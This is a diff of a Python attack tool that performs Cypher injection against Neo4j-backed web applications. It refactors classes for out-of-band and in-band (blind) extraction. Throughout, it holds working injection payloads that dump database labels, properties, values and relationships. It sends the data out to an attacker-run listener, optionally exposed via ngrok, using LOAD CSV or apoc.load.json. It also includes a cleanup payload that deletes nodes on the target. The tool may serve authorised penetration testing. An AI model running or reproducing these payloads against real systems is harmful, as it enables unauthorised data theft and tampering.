@@ -51,7 +51,7 @@ def get_data(timeout=5):
 
 
     except queue.Empty:
-        print(colored("[!] Injection failed, did not receive request from listener. WAF maybe ?", "red"))
+        print(colored("[!] Injection failed, did not receive request from listener.", "red"))
         return None
 
 
@@ -125,10 +125,6 @@ def convert_dict_to_table(data):
     table = tabulate(table_data, headers=headers, tablefmt="grid")
     print(table)
 
-
-
-
-
 def write_json_to_file(json_data, filename="output.json"):
     """Write JSON data to a file."""
 
@@ -191,7 +187,7 @@ class Listener():
     def stop_listener(self):
         self.server.shutdown()
 
-class OoBNeo4jInjector:
+class oob_Neo4jInjector:
     """Handles the injection of payloads into a Neo4j database with out of band exfiltration."""
     def __init__(self, target, exfil_ip, listen_port, request_type, parameters, cookie=None):
         self.target = target
@@ -297,15 +293,15 @@ class OoBNeo4jInjector:
             if option == "y":
                 self.exfil_payload = csv_exfil
             else:
-                print("\n[*] Continuing with LOAD CSV [*]")
+                print(colored("\n[*] Continuing with LOAD CSV [*]", "yellow"))
             return True
         
         elif (csv and not apoc):
-            print("No APOC detected, continuing with LOAD CSV...")
+            print(colored("No APOC detected, continuing with LOAD CSV...", "yellow"))
             return True
         
         elif (not csv and apoc):
-            print("Only APOC detected, continuing with APOC...")
+            print(colored("Only APOC detected, continuing with APOC...", "yellow"))
             return True
         
         elif (not csv and not apoc):
@@ -352,15 +348,7 @@ class OoBNeo4jInjector:
             print(f"[+] {label}")
 
         return labels
-    
-    def dump_node_count(self, label):
-        node_counts = []
-        # dump node count
-        self.inject_payload(f" RETURN 1 as x UNION MATCH (x:{label}) WITH COUNT(DISTINCT x) as exfilData {self.exfil_payload}")
-        node_count = get_data()  
-        node_counts.append(node_count)
 
-        return node_count
     
     def dump_properties(self, label):
         node_counts = []
@@ -385,6 +373,15 @@ class OoBNeo4jInjector:
             print(f"[++] {pr0perty}")
 
         return properties
+
+    def dump_node_count(self, label):
+        node_counts = []
+        # dump node count
+        self.inject_payload(f" RETURN 1 as x UNION MATCH (x:{label}) WITH COUNT(DISTINCT x) as exfilData {self.exfil_payload}")
+        node_count = get_data()  
+        node_counts.append(node_count)
+        print(f"[{node_count} entries]")
+        return node_count
 
     def dump_values(self, label, pr0perty):
         self.inject_payload(f" RETURN 1 as x UNION MATCH (x:{label}) WHERE x.{pr0perty} IS NOT NULL AND x.{pr0perty} <> '' WITH id(x) + ':' + x.{pr0perty} as id_{pr0perty}  WITH COLLECT(DISTINCT(id_{pr0perty})) AS list WITH REDUCE(mergedString = '', value in list | mergedString+value+'::') as exfilData WITH SUBSTRING(exfilData, 0, SIZE(exfilData) - 2) as exfilData WITH replace(exfilData, ' ', '%20') as exfilData {self.exfil_payload}")
@@ -445,16 +442,34 @@ class OoBNeo4jInjector:
                     print(f"[++] {relationship}")
 
 
+    def oob_dump_all(self):
+        labels = self.dump_labels()
+        for label in labels:
+            properties = self.dump_properties(label)
+            properties_dict = {}
+            for pr0perty in properties:
+                parsed_data = self.dump_values(label, pr0perty)
+                properties_dict.update(parsed_data)
+            node_count = self.dump_node_count(label)
+
+            formatted_dict = fully_dynamic_convert_data(properties_dict)
+            write_json_to_file(formatted_dict, f'{label}.json')
+
+            
+            convert_dict_to_table(formatted_dict)
+        self.exfil_relationship()
+
 
     def clean_up(self):
+        # fix this
         self.inject_payload(" RETURN 1 as x UNION MATCH (n) WHERE ANY(key IN keys(n) WHERE n[key] IN [1337, '1337']) AND NOT EXISTS ((n)--()) DETACH DELETE n RETURN 1337 as x//")
 
 
-class Neo4jInjector:
+class ib_Neo4jInjector:
     """Handles the injection of payloads into a Neo4j database."""
-    def __init__(self, target, exfil_ip, listen_port, request_type, parameters, cookie=None, blind_string=""):
+    def __init__(self, target, listen_port, request_type, parameters, cookie=None, blind_string=""):
         self.target = target
-        self.exfil_ip = f"{exfil_ip}:{str(listen_port)}"
+        #self.exfil_ip = f"{exfil_ip}:{str(listen_port)}"
         self.request_type = request_type
         self.parameters = parameters
         self.cookie = cookie if cookie else ""
@@ -559,152 +574,6 @@ class Neo4jInjector:
         return False
             
 
-    def exfil_data(self):
-
-        self.exfil_payload = f"LOAD CSV FROM '{self.exfil_ip}/?data='+exfilData as l RETURN 1337 as x//"
-
-        print("\n[*] APOC Check [*]")
-        self.inject_payload(f" RETURN 1 as x UNION WITH apoc.version() as exfilData {self.exfil_payload}")
-
-        apoc_version = get_data()
-        if apoc_version is None:
-            apoc_version = False
-
-        nested_dict = {'-': {'apoc_version': apoc_version}}
-        convert_dict_to_table(nested_dict)
-
-        if apoc_version != False:
-            check_vulnerability(apoc_version)
-            option = input("\nUse APOC to exfiltrate? (Y|N): ").lower()
-            if option == "y":
-                self.exfil_payload = f"CALL apoc.load.json('{self.exfil_ip}/?data='+exfilData) YIELD value RETURN 1337 as x//" 
-            elif option == "n":
-                print("\n[*] Continuing with LOAD CSV [*]")
-
-        print("\n[*] Version Check [*]")
-        self.inject_payload(f" RETURN 1 as x UNION CALL dbms.components() YIELD name, versions, edition UNWIND versions as version WITH DISTINCT replace(name,' ', '%20') as name,version,edition WITH name +':'+version+':'+edition as exfilData {self.exfil_payload}")
-
-        version_parts = get_data().split(':')
-        name, version, edition = version_parts[0], version_parts[1], version_parts[2]
-
-        if version_parts:
-            nested_dict = {'-': {'name': name, 'version': version, 'edition': edition}}
-            convert_dict_to_table(nested_dict)
-        else:
-            print(colored("[!] LOAD CSV blocked, try APOC", "red"))
-            sys.exit()
-
-        if edition == 'enterprise':
-            print(colored("\n[!] Neo4j Enterprise edition is detected, RBAC configuration could be blocking our payload.\n", "yellow"))
-
-        # dump label count
-        self.inject_payload(f" RETURN 1 as x UNION CALL db.labels() yield label WITH COUNT(DISTINCT label) as exfilData {self.exfil_payload}")
-
-        label_count = get_data()
-        
-        # dump labels
-        self.inject_payload(f" RETURN 1 as x UNION CALL db.labels() yield label WITH DISTINCT label as exfilData WITH COLLECT(exfilData) as list WITH REDUCE(mergedString = '', value in list | mergedString+value+'::') as exfilData WITH SUBSTRING(exfilData, 0, SIZE(exfilData) - 2) as exfilData WITH replace(exfilData, ' ', '%20') as exfilData {self.exfil_payload}")
-
-        labels = get_data().split('::') 
-
-        print(f"\n[*] available labels [{label_count}]:")
-        for label in labels:
-            print(f"[+] {label}")
-
-        node_counts = []
-        for label in labels:
-            # dump node count
-            self.inject_payload(f" RETURN 1 as x UNION MATCH (x:{label}) WITH COUNT(DISTINCT x) as exfilData {self.exfil_payload}")
-            node_count = get_data()  
-            node_counts.append(node_count)
-
-            # Dump property count
-            self.inject_payload(f" RETURN 1 as x UNION MATCH (x:{label}) UNWIND keys(x) as p WITH COUNT(DISTINCT p) as exfilData {self.exfil_payload}")
-
-            property_count = get_data()  
-
-            # dump properties
-            self.inject_payload(f" RETURN 1 as x UNION MATCH (x:{label}) UNWIND keys(x) as p WITH DISTINCT p WITH COLLECT(p) as list WITH REDUCE(mergedString = '', value in list | mergedString+value+'::') as exfilData WITH SUBSTRING(exfilData, 0, SIZE(exfilData) - 2) as exfilData WITH replace(exfilData, ' ', '%20') as exfilData {self.exfil_payload}")
-
-            print(f"\n[*] Label: {label}")
-            print(f"[+] available properties [{property_count}]:")
-            properties = get_data().split('::')
-
-            for pr0perty in properties:
-                print(f"[++] {pr0perty}")
-
-            properties_dict = {}
-            for pr0perty in properties:
-                self.inject_payload(f" RETURN 1 as x UNION MATCH (x:{label}) WHERE x.{pr0perty} IS NOT NULL AND x.{pr0perty} <> '' WITH id(x) + ':' + x.{pr0perty} as id_{pr0perty}  WITH COLLECT(DISTINCT(id_{pr0perty})) AS list WITH REDUCE(mergedString = '', value in list | mergedString+value+'::') as exfilData WITH SUBSTRING(exfilData, 0, SIZE(exfilData) - 2) as exfilData WITH replace(exfilData, ' ', '%20') as exfilData {self.exfil_payload}")
-                parsed_data = get_parsed_data()
-                # replace key name to pr0perty variable
-                parsed_data[pr0perty] =  parsed_data.pop("data")
-
-                properties_dict.update(parsed_data)
-
-            formatted_dict = fully_dynamic_convert_data(properties_dict)
-            write_json_to_file(formatted_dict, f'{label}.json')
-
-            
-            print(f"[{node_count} entries]")
-            convert_dict_to_table(formatted_dict)
-
-        
-    def exfil_relationship(self):
-
-        print("\n[*] Using LOAD CSV to Exfiltrate Relationships [*]")
-        # dump relationship count
-        self.inject_payload(f" RETURN 1 as x UNION MATCH (node1)-[relationship]-(node2) WITH COUNT(DISTINCT(type(relationship))) as exfilData {self.exfil_payload}")
-
-        relationship_count = get_data()  
-
-        if relationship_count is None or relationship_count == '0':
-            print(colored("[!] The database might not have any relationships. Exiting...", "red"))
-            sys.exit()
-
-        # dump relationships type
-        self.inject_payload(f" RETURN 1 as x UNION MATCH (node1)-[relationship]-(node2) WITH COLLECT(DISTINCT(type(relationship))) as list WITH REDUCE(mergedString = '', value in list | mergedString+value+'::') as exfilData WITH SUBSTRING(exfilData, 0, SIZE(exfilData) - 2) as exfilData WITH replace(exfilData, ' ', '%20') as exfilData {self.exfil_payload}")
-
-        
-        print(f"\n[*] relationships types [{relationship_count}]:")
-        relationships = get_data().split('::')
-        for relationship in relationships:
-            print(f"[+] {relationship}")
-
-        # dump relationships
-        found_relationships = []
-        counter = 0 
-        for rel_type in relationships:
-            # Initial payload injection to get relationships list
-            self.inject_payload(f" RETURN 1 as x UNION MATCH (node1)-[:{rel_type}]->(node2) WITH DISTINCT node1, node2 WITH toString(id(node1)) + ':{rel_type}:' + toString(id(node2)) as rows WITH COLLECT(rows) AS list WITH REDUCE(mergedString = '', value IN list | mergedString+value+'::') AS exfilData WITH SUBSTRING(exfilData, 0, SIZE(exfilData) - 2) as exfilData WITH replace(exfilData, ' ', '%20') as exfilData {self.exfil_payload}")
-            
-            relationships_list = get_data().split('::')
-
-            for relationship in relationships_list:
-                relationship_parts = relationship.split(':')
-                id1, rel_type, id2 = relationship_parts[0], relationship_parts[1], relationship_parts[2]
-                # verify relationship
-                # process each relationship direction
-                for id_from, id_to in [(id1, id2), (id2, id1)]:
-                    self.inject_payload(f" RETURN 1 as x UNION MATCH (node1)-[:{rel_type}]->(node2) WHERE id(node1) = {id_from} and id(node2) = {id_to} WITH DISTINCT node1, node2  UNWIND labels(node1) as label1 UNWIND labels(node2) as label2 WITH label1 + ':' + id(node1) + '-[:{rel_type}]-%3E' + label2 + ':' + id(node2) as exfilData {self.exfil_payload}")
-                    if not data_queue.empty():
-                        counter += 1
-                        relationship = get_data()
-                        found_relationships.append(relationship)
-            
-        print(f"\n[*] available relationships [{counter}]")
-        for rel_type in relationships:
-            print(f"[+] {rel_type}")
-            for relationship in found_relationships:
-                regex_rel_type = re.findall(r"\[:([^\]]+)\]", relationship)[0]
-                if regex_rel_type == rel_type:
-                    print(f"[++] {relationship}")
-
-
-
-    def clean_up(self):
-        self.inject_payload(" RETURN 1 as x UNION MATCH (n) WHERE ANY(key IN keys(n) WHERE n[key] IN [1337, '1337']) AND NOT EXISTS ((n)--()) DETACH DELETE n RETURN 1337 as x//")
-
     def complete_blind_payload(self, condition):
         random.seed(time.strftime("%H:%M:%S", time.localtime()))
         random_num = random.randint(0, 999)
@@ -741,7 +610,7 @@ class Neo4jInjector:
         for count_index in range(label_count):
             break_flag = False
             for size_index in range(1000):
-                responses = self.inject_payload(self.complete_blind_payload(f"EXISTS {{CALL db.labels() YIELD label WITH COLLECT(label) AS list WHERE SIZE(list[{count_index}]) = {size_index} RETURN list}}"))
+                responses = self.inject_payload(self.complete_blind_payload(f"EXISTS {{CALL db.labels() YIELD label WITH COLLECT(label) AS list WHERE SIZE(toString(list[{count_index}])) = {size_index} RETURN list}}"))
                 print(f"[{animation[anim_index % len(animation)]}] dumping label sizes, might take awhile", end='\r', flush=True)
                 anim_index += 1
                 for response in responses:
@@ -756,7 +625,7 @@ class Neo4jInjector:
 
     def dump_labels(self, label_sizes):
         print(f"\n[*] available labels [{len(label_sizes)}]")
-        valid_chars = string.ascii_letters + string.digits + string.punctuation
+        valid_chars = string.ascii_letters + string.digits + string.punctuation + ' '
         labels = []
         animation = "|/-\\"
         anim_index = 0
@@ -765,7 +634,7 @@ class Neo4jInjector:
             for size_index in range(size):
                 break_flag = False
                 for char in valid_chars:
-                    responses = self.inject_payload(self.complete_blind_payload(f"EXISTS {{CALL db.labels() YIELD label WITH COLLECT(label) AS list WHERE SUBSTRING(list[{count_index}], {size_index}, 1) = '{char}' RETURN list}}"))
+                    responses = self.inject_payload(self.complete_blind_payload(f"EXISTS {{CALL db.labels() YIELD label WITH COLLECT(label) AS list WHERE SUBSTRING(toString(list[{count_index}]), {size_index}, 1) = '{char}' RETURN list}}"))
                     print(f"[{animation[anim_index % len(animation)]}] building label: {label}{char}", end='\r', flush=True)
                     anim_index += 1
                     for response in responses:
@@ -810,7 +679,7 @@ class Neo4jInjector:
                 break_flag = False 
                 for size_index in range(1000):
                     # Construct and send your query
-                    responses = self.inject_payload(self.complete_blind_payload(f"EXISTS {{MATCH (x:{label}) UNWIND keys(x) as properties WITH COLLECT(DISTINCT(properties)) AS list WHERE SIZE(list[{count_index}]) = {size_index} RETURN list}}"))
+                    responses = self.inject_payload(self.complete_blind_payload(f"EXISTS {{MATCH (x:{label}) UNWIND keys(x) as properties WITH COLLECT(DISTINCT(properties)) AS list WHERE SIZE(toString(list[{count_index}])) = {size_index} RETURN list}}"))
                     print(f"[{animation[anim_index % len(animation)]}] dumping property sizes, might take awhile", end='\r', flush=True)
                     anim_index += 1
                     for response in responses:
@@ -828,7 +697,7 @@ class Neo4jInjector:
 
 
     def dump_properties(self, property_sizes_dict):
-        valid_chars = string.ascii_letters + string.digits + string.punctuation
+        valid_chars = string.ascii_letters + string.digits + string.punctuation + ' '
         properties_dict = {}
         animation = "|/-\\"
         anim_index = 0
@@ -840,7 +709,7 @@ class Neo4jInjector:
                 for size_index in range(size):
                     break_flag = False
                     for char in valid_chars:
-                        responses = self.inject_payload(self.complete_blind_payload(f"EXISTS {{MATCH (x:{label}) UNWIND keys(x) as properties WITH DISTINCT properties WITH COLLECT(properties) as list WHERE SUBSTRING(list[{count_index}],{size_index},1) = '{char}' RETURN list}}"))
+                        responses = self.inject_payload(self.complete_blind_payload(f"EXISTS {{MATCH (x:{label}) UNWIND keys(x) as properties WITH DISTINCT properties WITH COLLECT(properties) as list WHERE SUBSTRING(toString(list[{count_index}]),{size_index},1) = '{char}' RETURN list}}"))
                         print(f"[{animation[anim_index % len(animation)]}] building property: {pr0perty}{char}", end='\r', flush=True)
                         anim_index += 1
                         for response in responses:
@@ -866,7 +735,7 @@ class Neo4jInjector:
             for pr0perty in properties:
                 break_flag = False
                 for count_index in range(1000):
-                    responses = self.inject_payload(self.complete_blind_payload(f"COUNT {{MATCH (x:{label}) RETURN x.{pr0perty}}} = {count_index}"))
+                    responses = self.inject_payload(self.complete_blind_payload(f"COUNT {{MATCH (x:{label}) WHERE x.{pr0perty} IS NOT NULL AND x.{pr0perty} <> '' RETURN x.{pr0perty}}} = {count_index}"))
                     print(f"[{animation[anim_index % len(animation)]}] dumping value counts, might take awhile", end='\r', flush=True)
                     anim_index += 1
                     for response in responses:
@@ -895,7 +764,7 @@ class Neo4jInjector:
                 for count_index in range(count):  # Assuming 'size' here actually meant 'count' in your initial approach
                     break_flag = False
                     for size_index in range(1000):  # Assuming 'n' is the size you're looking to determine
-                        responses = self.inject_payload(self.complete_blind_payload(f"EXISTS {{MATCH (x:{label}) WITH COLLECT(x.{pr0perty}) as list WHERE SIZE(list[{count_index}]) = {size_index} RETURN list}}"))
+                        responses = self.inject_payload(self.complete_blind_payload(f"EXISTS {{MATCH (x:{label}) WHERE x.{pr0perty} IS NOT NULL AND x.{pr0perty} <> '' WITH COLLECT(x.{pr0perty}) as list WHERE SIZE(toString(list[{count_index}])) = {size_index} RETURN list}}"))
                         print(f"[{animation[anim_index % len(animation)]}] dumping value counts, might take awhile", end='\r', flush=True)
                         anim_index += 1
                         for response in responses:
@@ -910,7 +779,7 @@ class Neo4jInjector:
         return value_sizes_dict
 
     def dump_value(self, value_sizes_dict):
-        valid_chars = string.ascii_letters + string.digits + string.punctuation
+        valid_chars = string.ascii_letters + string.digits + string.punctuation + ' '
         values_dict = {}
         animation = "|/-\\"
         anim_index = 0
@@ -932,7 +801,7 @@ class Neo4jInjector:
                     for size_index in range(size):
                         break_flag = False
                         for char in valid_chars:
-                            responses = self.inject_payload(self.complete_blind_payload(f"EXISTS {{ MATCH (x:{label}) WITH COLLECT(x.{pr0perty}) as list WHERE SUBSTRING(list[{count_index}], {size_index}, 1) = '{char}' RETURN list}}"))
+                            responses = self.inject_payload(self.complete_blind_payload(f"EXISTS {{ MATCH (x:{label}) WHERE x.{pr0perty} IS NOT NULL AND x.{pr0perty} <> '' WITH COLLECT(x.{pr0perty}) as list WHERE SUBSTRING(toString(list[{count_index}]), {size_index}, 1) = '{char}' RETURN list}}"))
                             print(f"[{animation[anim_index % len(animation)]}] building value: {value}{char}", end='\r', flush=True)
                             anim_index += 1
                             for response in responses:
@@ -966,7 +835,8 @@ class Neo4jInjector:
         return values_dict
 
 
-    def blind_dump_all(self):
+    def ib_dump_all(self):
+        print(colored("[!] WARNING, This will take a long time.", "red"))
         label_count = self.find_label_count()
         label_sizes_dict = self.find_label_sizes(label_count)
         labels = self.dump_labels(label_sizes_dict)
@@ -1011,7 +881,7 @@ def main():
     if args.property and not args.label:
         parser.error("-P/--property requires -L/--label.")
 
-    if (args.out_of_band):
+    if args.out_of_band:
         listener = Listener(args.listen_port)
         listener_thread = threading.Thread(target=listener.start_listener, daemon=True)
         listener_thread.start() 
@@ -1035,9 +905,9 @@ def main():
         else:
             args.exfil_ip = "127.0.0.1"
 
-        injector = OoBNeo4jInjector(args.url, args.exfil_ip, args.listen_port, args.type, args.parameters, args.cookie)
+        injector = oob_Neo4jInjector(args.url, args.exfil_ip, args.listen_port, args.type, args.parameters, args.cookie)
 
-        if (injector.detect_inject()):
+        if injector.detect_inject():
             print(colored("[*] target likely injectable, continuing", "green"))
             print(f"[+] working character: [{injector.working_char}]")
         else:
@@ -1048,90 +918,78 @@ def main():
                 return
         injector.get_version()
             
-        if (args.dump_all):
-            labels = injector.dump_labels()
-            for label in labels:
-                node_count = injector.dump_node_count(label)
-                properties = injector.dump_properties(label)
-                properties_dict = {}
-                for pr0perty in properties:
-                    parsed_data = injector.dump_values(label, pr0perty)
-                    properties_dict.update(parsed_data)
+        if args.dump_all:
+            injector.oob_dump_all()
 
-                formatted_dict = fully_dynamic_convert_data(properties_dict)
-                write_json_to_file(formatted_dict, f'{label}.json')
-
-                print(f"[{node_count} entries]")
-                convert_dict_to_table(formatted_dict)
-            injector.exfil_relationship()
-
-        elif (args.labels):
+        elif args.labels:
             labels = injector.dump_labels()
         
-        elif (args.properties):
+        elif args.properties:
             properties, node_count = injector.dump_properties(args.label)
 
-        elif (args.property):
+        elif args.property:
             properties = args.property.split(",")
-            node_count = injector.dump_node_count(args.label)
             properties_dict = {}
             for pr0perty in properties:
                 parsed_data = injector.dump_values(args.label, pr0perty)
                 properties_dict.update(parsed_data)
-
+            node_count = injector.dump_node_count(args.label)
             formatted_dict = fully_dynamic_convert_data(properties_dict)
             write_json_to_file(formatted_dict, f'{args.label}.json')
-
-            print(f"[{node_count} entries]")
             convert_dict_to_table(formatted_dict)
 
-        elif (args.relationships):
+        elif args.relationships:
             injector.exfil_relationship()
 
         injector.clean_up()
         listener.stop_listener()
         listener_thread.join()
+
         if args.int == "public":
             ngrok.disconnect(start_ngrok.public_url)
         return
 
-    injector = Neo4jInjector(args.url, args.exfil_ip, args.listen_port, args.type, args.parameters, args.cookie, args.blind_string)
+    elif args.in_band:
+        injector = ib_Neo4jInjector(args.url, args.listen_port, args.type, args.parameters, args.cookie, args.blind_string)
 
-    if (injector.detect_inject()):
-        print(colored("[*] target likely injectable, continuing", "green"))
-        print(f"[+] working character: [{injector.working_char}]")
+        if (injector.detect_inject()):
+            print(colored("[*] target likely injectable, continuing", "green"))
+            print(f"[+] working character: [{injector.working_char}]")
+        else:
+            still_inject = input(colored("Target likely not injectable, continue? (y/n default: n)", "red")).lower()
+            if still_inject != "y":
+                return
+
+        if args.dump_all:
+            injector.ib_dump_all()
+
+        if args.labels:
+            label_count = injector.find_label_count()
+            label_sizes_dict = injector.find_label_sizes(label_count)
+            labels = injector.dump_labels(label_sizes_dict)
+
+        if args.label and args.properties:
+            labels = args.label.split(',')
+            property_counts_dict = injector.find_property_counts(labels)
+            property_sizes_dict = injector.find_property_sizes(property_counts_dict)
+            properties_dict = injector.dump_properties(property_sizes_dict)
+
+        if args.label and args.property:
+            # yet to handle multiple label, multiple properties
+            properties_dict = {}
+            labels = args.label.split(',')
+            properties = args.property.split(',')
+            for label in labels:
+                for pr0perty in properties:
+                    if label in properties_dict:
+                        properties_dict[label].append(pr0perty)
+                    else:
+                        properties_dict[label] = [pr0perty]
+            value_counts_dict = injector.find_value_count(properties_dict)
+            value_sizes_dict = injector.find_value_size(value_counts_dict)
+            values = injector.dump_value(value_sizes_dict)
     else:
-        still_inject = input(colored("Target likely not injectable, continue? (y/n default: n)", "red")).lower()
-        if still_inject != "y":
-            return
-
-    if args.dump_all:
-        injector.blind_dump_all()
-
-    if args.labels:
-        label_count = injector.find_label_count()
-        label_sizes_dict = injector.find_label_sizes(label_count)
-        labels = injector.dump_labels(label_sizes_dict)
-
-    if args.label and args.properties:
-        labels = args.label.split(',')
-        property_counts_dict = injector.find_property_counts(labels)
-        property_sizes_dict = injector.find_property_sizes(property_counts_dict)
-        properties_dict = injector.dump_properties(property_sizes_dict)
-
-    if args.label and args.property:
-        properties_dict = {}
-        labels = args.label.split(',')
-        properties = args.property.split(',')
-        for label in labels:
-            for pr0perty in properties:
-                if label in properties_dict:
-                    properties_dict[label].append(pr0perty)
-                else:
-                    properties_dict[label] = [pr0perty]
-        value_counts_dict = injector.find_value_count(properties_dict)
-        value_sizes_dict = injector.find_value_size(value_counts_dict)
-        values = injector.dump_value(value_sizes_dict)
+        print(colored("Choose: [--in-band/--out-of-band]", "red"))
 
     #injector.exfil_data()
     # injector.exfil_relationship()
